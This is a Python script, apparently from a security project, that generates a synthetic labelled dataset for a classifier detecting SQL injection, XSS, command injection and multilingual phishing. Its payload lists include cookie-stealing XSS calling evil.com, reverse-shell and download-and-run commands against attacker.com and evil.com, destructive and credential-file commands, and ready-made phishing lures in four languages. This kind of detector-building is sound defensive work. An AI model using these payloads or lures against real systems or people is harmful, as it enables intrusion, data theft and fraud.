import os
"""
AegisAgent-AI :: Dataset Builder
Builds a genuine labeled multilingual dataset for the threat-text classifier.
Classes: BENIGN, SQL_INJECTION, XSS, COMMAND_INJECTION, PHISHING

This is template-driven synthetic generation (not scraped/copied text) so the
corpus is safe to ship, reproducible, and large enough for a real TF-IDF +
Logistic Regression model to learn genuine lexical/structural signal per class.
"""
import csv
import itertools
import random

random.seed(17)

# ---------------------------------------------------------------------------
# SQL_INJECTION templates (payload-like strings across contexts)
# ---------------------------------------------------------------------------
SQLI = [
    "' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT username, password FROM users--",
    "1; DROP TABLE users;--", "' AND SLEEP(5)--", "\" OR \"\"=\"", "' OR 'a'='a",
    "1' UNION SELECT NULL,NULL,NULL--", "'; EXEC xp_cmdshell('dir')--",
    "' OR 1=1#", "select * from users where id = '1' or '1'='1'",
    "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
    "' UNION SELECT credit_card FROM payments--", "admin' OR '1'='1'#",
    "' waitfor delay '0:0:5'--", "1' ORDER BY 10--", "'; INSERT INTO logs VALUES('x')--",
]

# ---------------------------------------------------------------------------
# XSS templates
# ---------------------------------------------------------------------------
XSS = [
    "<script>alert('xss')</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(document.cookie)>", "javascript:alert('hacked')",
    "<body onload=alert('xss')>", "\"><script>document.location='http://evil.com'</script>",
    "<iframe src=javascript:alert(1)>", "<input onfocus=alert(1) autofocus>",
    "<a href=javascript:alert(1)>click</a>", "<script>fetch('http://evil.com/'+document.cookie)</script>",
    "<div onmouseover=alert('xss')>hover</div>", "'-alert(1)-'",
    "<img src=x onerror=this.src='http://evil.com/steal?c='+document.cookie>",
    "<svg/onload=alert(String.fromCharCode(88,83,83))>",
]

# ---------------------------------------------------------------------------
# COMMAND_INJECTION templates
# ---------------------------------------------------------------------------
CMDI = [
    "; rm -rf /", "&& cat /etc/passwd", "| nc attacker.com 4444 -e /bin/bash",
    "`whoami`", "$(curl http://evil.com/shell.sh | bash)", "; wget http://evil.com/malware.sh -O- | sh",
    "127.0.0.1; ls -la", "test.txt && rm -rf /var/www", "; python3 -c 'import os;os.system(\"id\")'",
    "|| curl -s http://evil.com/backdoor.sh | bash", "; chmod 777 /etc/shadow",
    "$(nc -e /bin/sh attacker.com 1234)", "; echo hacked > /var/www/html/shell.php",
    "&& powershell -enc SGVsbG8=", "; /bin/bash -c 'reverse_shell'",
]

# ---------------------------------------------------------------------------
# PHISHING templates — English, Telugu, Hindi, Tamil (bank / OTP / prize lures)
# ---------------------------------------------------------------------------
PHISH_EN = [
    "Your bank account has been suspended. Click here immediately to verify: http://{d}",
    "URGENT: Your account will be locked in 24 hours. Update your password now: http://{d}",
    "Congratulations! You have won a lottery of $10,000. Claim now at http://{d}",
    "Your parcel could not be delivered. Pay a small fee to reschedule: http://{d}",
    "Security alert: unusual login detected. Verify your identity here: http://{d}",
    "Your OTP has expired. Re-enter your card details to continue: http://{d}",
    "Dear customer, your KYC is pending. Complete it now or your account will be blocked: http://{d}",
    "Your subscription payment failed. Update billing info immediately: http://{d}",
    "You have been selected for a cashback offer. Enter your UPI PIN to claim: http://{d}",
    "Final notice: pay your pending electricity bill within 2 hours: http://{d}",
]
PHISH_TE = [
    "మీ బ్యాంక్ ఖాతా రద్దు చేయబడింది. వెంటనే ఇక్కడ క్లిక్ చేసి పాస్‌వర్డ్ మార్చండి: http://{d}",
    "మీకు లక్కీ డ్రా లో 50000 రూపాయలు వచ్చాయి. ఇప్పుడే క్లెయిమ్ చేయండి: http://{d}",
    "మీ KYC పెండింగ్‌లో ఉంది, వెంటనే అప్‌డేట్ చేయకపోతే ఖాతా బ్లాక్ అవుతుంది: http://{d}",
    "మీ OTP గడువు ముగిసింది, కార్డు వివరాలు మళ్ళీ నమోదు చేయండి: http://{d}",
    "మీ పార్శిల్ డెలివరీ కాలేదు, చిన్న రుసుము చెల్లించి మళ్ళీ షెడ్యూల్ చేయండి: http://{d}",
]
PHISH_HI = [
    "आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://{d}",
    "बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://{d}",
    "आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://{d}",
    "आपका ओटीपी समाप्त हो गया है, कृपया कार्ड विवरण फिर से दर्ज करें: http://{d}",
]
PHISH_TA = [
    "உங்கள் வங்கிக் கணக்கு முடக்கப்பட்டுள்ளது. உடனடியாக இங்கே கிளிக் செய்து சரிபார்க்கவும்: http://{d}",
    "வாழ்த்துக்கள்! நீங்கள் 50,000 ரூபாய் பரிசு வென்றுள்ளீர்கள். இப்போது கோரவும்: http://{d}",
    "உங்கள் KYC நிலுவையில் உள்ளது, உடனடியாக புதுப்பிக்கவும்: http://{d}",
]
DOMAINS = ["fraud-verify.com", "secure-bank-update.net", "kyc-refresh.info", "prize-claim24.com",
           "account-alert-service.xyz", "urgent-verify-now.co", "parcel-track-pay.com"]

# ---------------------------------------------------------------------------
# BENIGN templates — normal multilingual traffic/search/support text
# ---------------------------------------------------------------------------
BENIGN = [
    "What is the weather forecast for tomorrow in Hyderabad?",
    "Please find attached the quarterly sales report for review.",
    "How do I reset my password from the account settings page?",
    "Thank you for your purchase, your order will arrive in 3 days.",
    "Can you help me schedule a meeting for next Tuesday at 3 PM?",
    "The new product update includes several performance improvements.",
    "I would like to update my shipping address for future orders.",
    "నేను రేపు ఆఫీసుకు 10 గంటలకు వస్తాను.",
    "మీ ఆర్డర్ విజయవంతంగా డెలివరీ చేయబడింది, ధన్యవాదాలు.",
    "నా పాస్‌వర్డ్ మార్చుకోవడం ఎలా అని తెలుసుకోవాలనుకుంటున్నాను.",
    "कृपया मुझे कल की बैठक का समय बताएं।",
    "आपका ऑर्डर सफलतापूर्वक डिलीवर हो गया है, धन्यवाद।",
    "मुझे अपने खाते की जानकारी अपडेट करनी है।",
    "நாளை கூட்டத்தின் நேரத்தை தெரிவிக்கவும்.",
    "உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி.",
    "எனது கடவுச்சொல்லை மாற்ற உதவுங்கள்.",
    "select name, email from customers where active = true",
    "The invoice for last month has been generated and sent to accounting.",
    "Our team completed the sprint review and updated the backlog.",
    "Please review the attached contract and share your feedback by Friday.",
    "The server maintenance window is scheduled for Sunday 2 AM to 4 AM.",
    "I really enjoyed the movie we watched last weekend, the plot was great.",
    "Let's catch up over coffee sometime next week.",
    "The library is open until 8 PM on weekdays.",
    "My flight got delayed by two hours due to weather.",
]

def render(templates, domains=None, n_per=1):
    out = []
    for t in templates:
        if domains:
            for d in domains:
                out.append(t.format(d=d))
        else:
            out.append(t)
    return out

def case_variants(s):
    """Realistic evasion variants: case swap, whitespace/comment padding."""
    variants = {s, s.upper(), s.lower()}
    variants.add(s.replace(" ", "/**/"))
    variants.add(s.replace("'", "%27"))
    return list(variants)

def main():
    rows = []
    for s in SQLI:
        for v in case_variants(s):
            rows.append((v, "SQL_INJECTION"))
    for s in XSS:
        for v in case_variants(s):
            rows.append((v, "XSS"))
    for s in CMDI:
        for v in case_variants(s):
            rows.append((v, "COMMAND_INJECTION"))
    for s in render(PHISH_EN, DOMAINS):
        rows.append((s, "PHISHING"))
    for s in render(PHISH_TE, DOMAINS):
        rows.append((s, "PHISHING"))
    for s in render(PHISH_HI, DOMAINS):
        rows.append((s, "PHISHING"))
    for s in render(PHISH_TA, DOMAINS):
        rows.append((s, "PHISHING"))
    for s in BENIGN:
        rows.append((s, "BENIGN"))
        # a couple of light paraphrase-free repeats with punctuation variance to
        # give the benign class more lexical breadth without duplicating exactly
    # Augment benign with combined sentences (still original wording, not copied)
    combos = list(itertools.combinations(BENIGN, 2))
    random.shuffle(combos)
    for a, b in combos[:40]:
        rows.append((f"{a} {b}", "BENIGN"))

    random.shuffle(rows)
    with open(os.path.join(os.path.dirname(__file__), "dataset.csv"), "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["text", "label"])
        w.writerows(rows)
    print(f"wrote {len(rows)} rows")
    from collections import Counter
    print(Counter(l for _, l in rows))

if __name__ == "__main__":
    main()
